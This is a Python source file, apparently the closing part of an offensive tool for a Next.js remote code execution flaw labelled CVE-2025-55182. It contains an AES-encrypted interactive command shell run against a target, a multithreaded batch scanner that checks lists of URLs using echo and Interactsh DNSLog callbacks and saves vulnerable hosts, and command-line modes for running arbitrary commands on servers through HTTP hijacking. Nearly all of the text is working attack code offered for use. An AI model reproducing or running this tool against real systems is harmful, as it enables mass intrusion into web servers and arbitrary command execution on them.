        # 获取用户权限信息
        if os_type in ['linux', 'macos', 'bsd']:
            print(f"[*] Executing: id")
            id_success, id_result, _ = exec_cmd_v3('id')
            if id_success and id_result.strip():
                print(f"[+] \033[1;36m{id_result.strip()}\033[0m")
        elif os_type == 'windows':
            print(f"[*] Executing: whoami /priv")
            priv_success, priv_result, _ = exec_cmd_v3('whoami /priv')
            if priv_success and priv_result.strip():
                print(f"[+] \033[1;36m{priv_result.strip()[:200]}\033[0m")

        print()
        print(f"============================================================")
        print(f"Interactive Shell V3 (AES-256-CBC Encrypted)")
        print(f"Type 'exit' or 'quit' to exit")
        print(f"============================================================")

        while True:
            try:
                command = input("$ ").strip()

                if not command:
                    continue

                if command.lower() in ['exit', 'quit']:
                    break

                # 通过 AES 加密执行命令
                try:
                    enc_cmd = aes_encrypt(command)
                    resp = self.session.post(exec_url, data=enc_cmd, timeout=30)

                    if resp.status_code == 200:
                        try:
                            dec_result = aes_decrypt(resp.text)
                            result = json.loads(dec_result)
                            if result.get('success'):
                                stdout = result.get('stdout', '')
                                stderr = result.get('stderr', '')
                                if stdout:
                                    print(stdout.rstrip())
                                if stderr:
                                    print(f"\033[1;31m{stderr.rstrip()}\033[0m", file=sys.stderr)
                            else:
                                print(f"Error: {result.get('error')}", file=sys.stderr)
                        except Exception as e:
                            print(f"Decrypt error: {str(e)}", file=sys.stderr)
                    else:
                        print(f"HTTP Error: {resp.status_code}", file=sys.stderr)

                except requests.exceptions.Timeout:
                    print("Error: Request timeout", file=sys.stderr)
                except Exception as e:
                    print(f"Error: {str(e)}", file=sys.stderr)

            except KeyboardInterrupt:
                print("\n")
                break
            except EOFError:
                print("")
                break


           



def verify_single_target(target, path, use_echo, use_dnslog, results, index, total, proxy=None):
    """
    验证单个目标（用于多线程）

    Args:
        target: 目标 URL
        path: 自定义路径
        use_echo: 是否使用 Echo 验证
        use_dnslog: 是否使用 DNSLog 验证
        results: 结果字典（线程安全）
        index: 当前索引
        total: 总数
        proxy: 代理地址
    """
    try:
        # 静默模式创建 exploit 实例
        exploit = NextJSRCEExploit(target, path=path, use_echo=use_echo, use_dnslog=use_dnslog, silent=True, proxy=proxy)

        # 获取完整路径（包括 302 跳转后的路径）
        full_target = exploit.target_url

        # 静默验证
        result, os_info = exploit.verify_vulnerability_silent()
        if result is True:
            with print_lock:
                print(f"\033[1;32m[+] VULNERABLE: {full_target}\033[0m")
                if os_info:
                    print(f"    OS: {os_info}")

            results['vulnerable'].append({
                'target': full_target,
                'os': os_info
            })

            write_queue.put(f"{full_target}|{os_info or ''}")




        elif result is None:
            # 需要手动验证
            dnslog_domain = exploit.interactsh.subdomain if exploit.interactsh else 'N/A'
            results['manual'].append({'target': full_target, 'dnslog_domain': dnslog_domain})
            logger.info(f"Manual check needed: {full_target} | DNSLog: {dnslog_domain}")
        else:
            # 不脆弱，记录到日志
            logger.info(f"Not vulnerable: {full_target}")

    except Exception as e:
        # 错误记录到日志
        logger.error(f"Error testing {target}: {str(e)}")
        results['errors'].append({'target': target, 'error': str(e)})


def batch_verify(targets_file, path=None, use_echo=True, use_dnslog=False, threads=10, proxy=None):
    """
    批量验证漏洞（多线程）

    Args:
        targets_file: 包含目标URL的文件路径（每行一个URL）
        path: 自定义路径
        use_echo: 是否使用 Echo 验证
        use_dnslog: 是否使用 Interactsh DNSLog 验证
        threads: 线程数（默认10）
        proxy: 代理地址
    """
    print(f"[*] Loading targets from {targets_file}")

    try:
        with open(targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"[-] Error: File '{targets_file}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading file: {str(e)}")
        sys.exit(1)

    total = len(targets)
    print(f"[*] Loaded {total} targets")
    print(f"[*] Threads: {threads}")
    print(f"[*] Log file: {LOG_FILE}")

    if use_echo and use_dnslog:
        print(f"[*] Mode: \033[1;36mEcho + DNSLog (Interactsh oast.pro)\033[0m")
    elif use_dnslog:
        print(f"[*] Mode: \033[1;36mDNSLog Only (Interactsh oast.pro)\033[0m")
    else:
        print(f"[*] Mode: \033[1;36mEcho verification only\033[0m")

    if proxy:
        print(f"[*] Proxy: {proxy}")

    print("=" * 60)
    print(f"[*] Starting scan at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Only showing \033[1;32mVULNERABLE\033[0m targets...")
    print("=" * 60)

    # 线程安全的结果存储
    results = {
        'vulnerable': [],
        'manual': [],
        'errors': []
    }

    start_time = time.time()
    completed = 0


    # 使用线程池
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(verify_single_target, target, path, use_echo, use_dnslog, results, i, total, proxy): target
            for i, target in enumerate(targets, 1)
        }

        for future in as_completed(futures):
            completed += 1
            # 每完成 100 个或完成时显示进度
            if completed % 100 == 0 or completed == total:
                elapsed = time.time() - start_time
                rate = completed / elapsed if elapsed > 0 else 0
                with print_lock:
                    print(f"[*] Progress: {completed}/{total} ({completed*100//total}%) - {rate:.1f} targets/sec")

    elapsed_time = time.time() - start_time
    write_queue.put(stop_writer)
    writer.join() 
    # 输出总结
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Total targets tested: {total}")
    print(f"Time elapsed: {elapsed_time:.2f}s ({total/elapsed_time:.1f} targets/sec)")
    print(f"\033[1;32mVulnerable: {len(results['vulnerable'])}\033[0m")
    print(f"\033[1;33mManual check: {len(results['manual'])}\033[0m")
    print(f"\033[1;31mErrors: {len(results['errors'])}\033[0m (see {LOG_FILE})")

    if results['vulnerable']:
        print("\n\033[1;32m[+] Vulnerable targets:\033[0m")
        for item in results['vulnerable']:
            os_info = f" ({item['os']})" if item.get('os') else ""
            print(f"  - {item['target']}{os_info}")

        # 保存结果到文件
        output_file = "vulnerable_targets.txt"
        try:
            with open(output_file, 'w') as f:
                for item in results['vulnerable']:
                    os_info = item.get('os', '')
                    f.write(f"{item['target']}|{os_info}\n")
            print(f"\n[+] Results saved to: {output_file}")
        except Exception as e:
            print(f"[-] Failed to save results: {str(e)}")

    if results['manual']:
        print("\n\033[1;33m[!] Targets requiring manual verification:\033[0m")
        for item in results['manual']:
            print(f"  - {item['target']}")

        # 保存需要手动验证的目标
        manual_file = "needs_manual_check.txt"
        try:
            with open(manual_file, 'w') as f:
                for item in results['manual']:
                    f.write(f"{item['target']}|{item['dnslog_domain']}\n")
            print(f"\n[+] Manual check list saved to: {manual_file}")
        except Exception as e:
            print(f"[-] Failed to save manual check list: {str(e)}")

    if not results['vulnerable'] and not results['manual']:
        print("\n[-] No vulnerable targets found")

    print(f"\n[*] Errors logged to: {LOG_FILE}")


def main():
    """
    主函数
    """
    parser = argparse.ArgumentParser(
        description='CVE-2025-55182 Next.js RCE Exploit - Interactive Command Execution by ruoji \n\n https://github.com/RuoJi6/CVE-2025-55182-RCE-shell',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # POC mode - Echo verification only
  %(prog)s -poc http://example.com

  # DNSLog mode - Interactsh DNSLog verification only
  %(prog)s -dnslog http://example.com

  # Both Echo and DNSLog verification
  %(prog)s -poc -dnslog http://example.com

  # Batch POC mode (multi-threaded)
  %(prog)s -poc -f url.txt
  %(prog)s -poc -f url.txt -t 20       # 20 threads
  %(prog)s -dnslog -f url.txt -t 5     # 5 threads (slower for DNSLog)

  # EXP mode - Execute single command (base64 echo)
  %(prog)s -exp "whoami" http://example.com

  # EXP mode - Interactive shell (base64 echo)
  %(prog)s -exp http://example.com

  # EXP2 mode - Execute single command (HTTP hijack + POST + Base64)
  %(prog)s -exp2 "whoami" http://example.com

  # EXP2 mode - Interactive shell (HTTP hijack + POST + Base64)
  %(prog)s -exp2 http://example.com

  # EXP3 mode - Execute single command (HTTP hijack + POST + AES-256-CBC)
  %(prog)s -exp3 "whoami" http://example.com

  # EXP3 mode - Interactive shell (HTTP hijack + POST + AES-256-CBC)
  %(prog)s -exp3 http://example.com
        """
    )

    parser.add_argument('target', nargs='?', help='Target URL (e.g., http://example.com)')
    parser.add_argument('-p', '--path', help='Custom path (e.g., /apps). If not specified, use random path', default=None)
    parser.add_argument('-poc', '--poc', action='store_true', help='POC mode - Echo verification')
    parser.add_argument('-dnslog', action='store_true', help='DNSLog mode - Interactsh DNSLog verification (oast.pro)')
    parser.add_argument('-exp', nargs='?', const='', default=None, metavar='CMD', help='EXP mode (base64 echo) - Execute command or enter interactive shell if no command provided')
    parser.add_argument('-exp2', nargs='?', const='', default=None, metavar='CMD', help='EXP2 mode (HTTP hijack + Base64) - Execute command or enter interactive shell if no command provided')
    parser.add_argument('-exp3', nargs='?', const='', default=None, metavar='CMD', help='EXP3 mode (HTTP hijack + AES-256-CBC) - Execute command or enter interactive shell if no command provided')
    parser.add_argument('-f', '--file', help='File containing target URLs (one per line) for batch verification', default=None)
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads for batch scanning (default: 10)')
    parser.add_argument('-proxy', '--proxy', help='Proxy address (e.g., 127.0.0.1:8080 for Burp)', default=None)

    args = parser.parse_args()

    # 修复参数解析问题：如果 -exp/-exp2/-exp3 的值看起来像 URL，则将其作为 target
    def is_url(s):
        return s and (s.startswith('http://') or s.startswith('https://'))

    # 检查并修正 -exp, -exp2, -exp3 参数
    for exp_name in ['exp', 'exp2', 'exp3']:
        exp_val = getattr(args, exp_name)
        if exp_val and is_url(exp_val):
            # URL 被错误地当作命令了，修正它
            if not args.target:
                args.target = exp_val
                setattr(args, exp_name, '')  # 设为空字符串，进入交互式模式

    # 确定验证模式
    # -poc: Echo 验证
    # --dnslog: DNSLog 验证
    # -poc --dnslog: 两个都验证
    use_echo = args.poc
    use_dnslog = args.dnslog

    # 批量验证模式
    if args.file:
        if not args.poc and not args.dnslog:
            print("[-] Error: -f/--file requires -poc or --dnslog")
            sys.exit(1)
        batch_verify(args.file, path=args.path, use_echo=use_echo, use_dnslog=use_dnslog, threads=args.threads, proxy=args.proxy)
        sys.exit(0)

    # 检查是否提供了目标
    if not args.target:
        parser.print_help()
        sys.exit(1)

    # 创建利用实例
    exploit = NextJSRCEExploit(args.target, path=args.path, use_echo=use_echo, use_dnslog=use_dnslog, proxy=args.proxy)

    print(f"[+] Target: {exploit.target_url}\n")

    # POC/DNSLog 验证模式
    if args.poc or args.dnslog:
        result = exploit.verify_vulnerability()
        sys.exit(0 if result else 1)

    # EXP 模式 (base64 echo)
    elif args.exp is not None:
        if args.exp:  # 有命令参数，执行单命令
            # 打印 EXP Banner
            exploit._print_exp_banner('exp')
            print(f"[*] Step 1: Executing command...")
            print(f"    ├── Target: {exploit.target_url}")
            print(f"    └── Command: {args.exp}")
            print()
            success, result = exploit.execute_command(args.exp)
            if success:
                print(f"[*] Step 2: Result received")
                print(f"    └── \033[1;32m✓ Success!\033[0m")
                print()
                print(result)
                sys.exit(0)
            else:
                print(f"    └── \033[1;31m✗ Failed!\033[0m")
                print(f"Error: {result}", file=sys.stderr)
                sys.exit(1)
        else:  # 无命令参数，进入交互式
            exploit.interactive_shell()

    # EXP2 模式 (HTTP hijack + POST + Base64)
    elif args.exp2 is not None:
        if args.exp2:  # 有命令参数，执行单命令
            success, result = exploit.execute_command_v2(args.exp2)
            if success:
                print(result)
                sys.exit(0)
            else:
                print(f"Error: {result}", file=sys.stderr)
                sys.exit(1)
        else:  # 无命令参数，进入交互式
            exploit.interactive_shell_v2()

    # EXP3 模式 (HTTP hijack + POST + AES-256-CBC)
    elif args.exp3 is not None:
        if args.exp3:  # 有命令参数，执行单命令
            success, result = exploit.execute_command_v3(args.exp3)
            if success:
                print(result)
                sys.exit(0)
            else:
                print(f"Error: {result}", file=sys.stderr)
                sys.exit(1)
        else:  # 无命令参数，进入交互式
            exploit.interactive_shell_v3()

    # 默认：显示帮助
    else:
        print("[-] Error: Please specify a mode (-poc, -dnslog, -exp, -exp2, -exp3, or -f)")
        parser.print_help()
        sys.exit(1)

output_fh.close()


if __name__ == '__main__':
    main()
